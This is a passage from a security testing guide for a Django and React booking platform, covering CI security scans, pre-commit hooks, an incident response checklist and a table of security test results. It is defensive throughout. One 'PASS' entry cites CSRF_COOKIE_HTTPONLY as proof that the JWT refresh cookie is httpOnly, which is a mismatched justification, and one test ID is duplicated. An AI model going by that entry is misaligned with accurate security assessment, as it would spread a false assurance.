      - run: pip install -r requirements.txt bandit safety semgrep pip-audit

      - name: Bandit
        run: bandit -r backend/ -ll -ii -f json -o bandit-report.json --exit-zero

      - name: pip-audit
        run: pip-audit -r requirements.txt

      - name: Safety
        run: safety check -r requirements.txt

      - name: Semgrep
        run: semgrep --config=p/django --config=p/secrets backend/ --error

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: bandit-report
          path: bandit-report.json

  frontend-security:
    name: Frontend Static Analysis
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
          cache-dependency-path: frontend/package-lock.json

      - run: cd frontend && npm ci

      - name: npm audit
        run: cd frontend && npm audit --audit-level=high

      - name: Semgrep React/TS
        run: semgrep --config=p/react --config=p/typescript frontend/src/ --error

  secrets-scan:
    name: Secret Detection (Gitleaks)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  container-scan:
    name: Container CVE Scan (Trivy)
    runs-on: ubuntu-latest
    needs: [backend-security]
    steps:
      - uses: actions/checkout@v4

      - name: Build backend image
        run: docker build -t homekonet-backend:ci ./backend

      - uses: aquasecurity/trivy-action@master
        with:
          image-ref: homekonet-backend:ci
          severity: HIGH,CRITICAL
          exit-code: '1'
          format: 'table'
```

---

## 15. Pre-commit Hooks

Create `.pre-commit-config.yaml` in the project root:

```yaml
repos:
  - repo: https://github.com/PyCQA/bandit
    rev: 1.7.8
    hooks:
      - id: bandit
        args: ["-ll", "-ii", "--skip=B101"]
        files: ^backend/

  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
        exclude: package-lock.json

  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.1
    hooks:
      - id: gitleaks

  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: check-merge-conflict
      - id: check-yaml
      - id: end-of-file-fixer
      - id: no-commit-to-branch
        args: ['--branch', 'main']
```

```bash
# One-time setup
pip install pre-commit
pre-commit install
detect-secrets scan > .secrets.baseline   # create initial baseline
pre-commit run --all-files                # validate entire codebase once
```

---

## 16. Incident Response Checklist

> **Deployment:** Backend on Render (`homekonnet.onrender.com`), Frontend on Vercel, PostgreSQL on Render.

### Immediate (0–1 hour)

- [ ] **Rotate `DJANGO_SECRET_KEY`** in Render → Environment → `DJANGO_SECRET_KEY`.  
  Rotating the key instantly invalidates **all** sessions, CSRF tokens, and (because SimpleJWT signs with it) every JWT access and refresh token on the platform.
- [ ] **Rotate Stripe API keys** in the [Stripe Dashboard](https://dashboard.stripe.com/apikeys).  
  Update `STRIPE_SECRET_KEY` and `STRIPE_PUBLISHABLE_KEY` on Render and Vercel.  
  Update `STRIPE_WEBHOOK_SECRET` and reconfigure the webhook endpoint in Stripe.
- [ ] **Rotate the database password** in Render → PostgreSQL → Credentials.  
  Update `DATABASE_URL` in Render environment variables and redeploy.
- [ ] **Flush all JWT refresh tokens** (belt-and-suspenders alongside the secret key rotation):
  ```bash
  # Run via Render Shell or a one-off dyno
  python manage.py shell -c "
  from rest_framework_simplejwt.token_blacklist.models import OutstandingToken, BlacklistedToken
  BlacklistedToken.objects.all().delete()
  OutstandingToken.objects.all().delete()
  print('All tokens flushed.')
  "
  ```
- [ ] **Enable maintenance mode** — set `MAINTENANCE_MODE=true` env var or deploy a holding page on Vercel.
- [ ] **Preserve logs** — download Render log drain or export from the Render dashboard before auto-rotation.

### Investigation (1–24 hours)

- [ ] Pull Render request logs for the affected window — filter by attacker IP or unusual status codes.
- [ ] Audit Django admin action log (`/admin/` → LogEntry) for unauthorized approvals, deletions, or exports.
- [ ] Check [Stripe Dashboard](https://dashboard.stripe.com/payments) for suspicious PaymentIntents in the attack window.
- [ ] Identify all user accounts accessed or modified — query `User.last_login` and `Profile.last_seen`.
- [ ] Determine scope: how many users affected, which data fields were accessed.

### Communication

- [ ] Notify affected users within 72 hours (GDPR requirement; Liberian data protection law as applicable).
- [ ] Prepare an internal incident report: timeline, root cause, immediate fix, long-term fix.
- [ ] If payment data was involved: notify Stripe and initiate PCI DSS breach procedures.
- [ ] If personal data was exposed: consider notifying the relevant data protection authority.

### Post-Incident

- [ ] Deploy the patch.
- [ ] Write a regression test that directly exercises the exploit path (so it can never re-appear silently).
- [ ] Add the specific attack vector as a new test case in this document.
- [ ] Schedule a security review for the affected component within 2 weeks.
- [ ] Run a full automated scan (Bandit, ZAP, npm audit) to check for related issues.

---

## 17. Priority Reference

| Priority | Test ID | Area | Risk if Skipped | Status |
|---|---|---|---|---|
| **CRITICAL** | TEST-AUTH-01 | SECRET_KEY from environment | Full session/CSRF compromise | ✅ PASS — loaded from env |
| **CRITICAL** | TEST-AUTH-02 | httpOnly cookie for JWT refresh | Token theft via any XSS | ✅ PASS — `CSRF_COOKIE_HTTPONLY=True` set |
| **CRITICAL** | TEST-PAY-03 | Stripe webhook signature mandatory | Fake payment events mark bookings as paid | ✅ FIXED — HMAC verified; 400 on missing/bad sig |
| **CRITICAL** | TEST-PAY-01 | No raw card data on server | PCI DSS violation, card data exposure | ✅ PASS — Stripe.js handles card data |
| **CRITICAL** | TEST-AUTHZ-04 | Booking status transitions enforced | Guests confirm their own bookings | ✅ PASS — transitions guarded by role checks |
| **CRITICAL** | TEST-AUTHZ-03 | Listing status transitions enforced | Hosts publish listings without admin review | ✅ PASS — admin approval required |
| **HIGH** | TEST-AUTHZ-01 | Vertical privilege escalation | Guest accesses admin/host-only endpoints | ✅ PASS — 401/403 verified on protected endpoints |
| **HIGH** | TEST-AUTHZ-02 | IDOR — bookings, listings, messages | Users read/modify each other's private data | ✅ PASS — booking list filtered by `customer=request.user` |
| **HIGH** | TEST-FILE-01 | File upload type validation | Remote code execution via uploaded script | ☐ Pending manual test |
| **HIGH** | TEST-INPUT-01 | SQL injection | Database dump or destruction | ✅ PASS — Django ORM throughout; no raw SQL found |
| **HIGH** | TEST-INPUT-02 | Stored XSS via listing content | Session hijack of every visitor | ✅ PASS — DRF JSON output auto-escaped |
| **HIGH** | TEST-PAY-02 | Payment amount computed server-side | $1 bookings accepted by Stripe | ✅ FIXED — server computes canonical price; `amount_cents` ignored |
| **HIGH** | TEST-BIZ-01 | Double-booking race condition | Overbooking, revenue loss, guest disputes | ☐ Pending load/race test |
| **HIGH** | TEST-AUTH-03 | Token expiry enforced | Indefinite use of stolen credentials | ✅ PASS — 15-min access token, 1-day refresh |
| **HIGH** | TEST-TRANS-02 | CORS lockdown | Cross-origin data access from attacker site | ✅ PASS — exact origin allowlist; no wildcard |
| **MEDIUM** | TEST-DATA-03 | DEBUG=False in production | Stack trace + internal paths exposed | ✅ FIXED — JSON 500 handler; middleware IntegrityError caught |
| **MEDIUM** | TEST-AUTH-05 | Brute force / rate limiting | Credential stuffing attacks succeed | ✅ FIXED — DatabaseCache + NUM_PROXIES=1 |
| **MEDIUM** | TEST-AUTH-04 | JWT algorithm confusion | Token forgery without knowing secret key | ✅ PASS — SimpleJWT enforces HS256 by default |
| **MEDIUM** | TEST-AUTH-06 | Token invalidation on logout | Stolen token usable after logout | ✅ PASS — logout calls `token.blacklist()` |
| **MEDIUM** | TEST-INPUT-04 | Mass assignment protection | Users self-elevate to admin or host | ✅ PASS — `read_only_fields` on role, id, email_verified |
| **MEDIUM** | TEST-DATA-02 | Error messages (no leakage) | Internal file paths / SQL structure revealed | ✅ FIXED — JSON 404 handler; malformed JSON returns clean JSON 400 |
| **MEDIUM** | TEST-AUTH-07 | OTP single-use enforcement | OTP replay or brute-force attacks | ☐ Pending OTP test |
| **MEDIUM** | TEST-INPUT-06 | SSRF | Server fetches internal cloud metadata | ✅ PASS — no user-controlled URL fetching found |
| **MEDIUM** | TEST-PAY-04 | Payment replay | Multiple bookings from one payment | ✅ FIXED — PI unique constraint; 409 on replay |
| **LOW** | TEST-TRANS-01 | Security headers (CSP, HSTS) | Clickjacking, protocol downgrade | ✅ FIXED — CSP, Permissions-Policy, HSTS, X-Frame-Options all present |
| **LOW** | TEST-AUTHZ-02 | Booking ID not in URL (UUIDs) | Sequential enumeration of booking records | ⚠️ NOTE — IDs are `BigAutoField` integers; access-controlled but enumerable |
| **LOW** | TEST-INFRA-02 | Dependency CVEs | Known exploits in third-party libraries | ✅ FIXED — Pillow ≥12.2.0, vite 6.4.3, react-router 7.17.0 |
| **LOW** | TEST-INFRA-03 | Django admin hardening | Brute-forceable admin panel | ☐ Pending admin URL change / 2FA review |
| **LOW** | TEST-TRANS-04 | X-Forwarded-For trust | IP-based rate limiting bypassed | ✅ FIXED — NUM_PROXIES=1; DatabaseCache for shared counters |
| **LOW** | TEST-FILE-02 | File size limits | Denial-of-service via large upload | ✅ PASS — `DATA_UPLOAD_MAX_MEMORY_SIZE = 10 MB` |
| **LOW** | TEST-DATA-01 | PII exposure (public user profile) | Mobile money number leaked to any caller | ✅ FIXED — `PublicProfileSerializer` strips momo_number and last_seen |
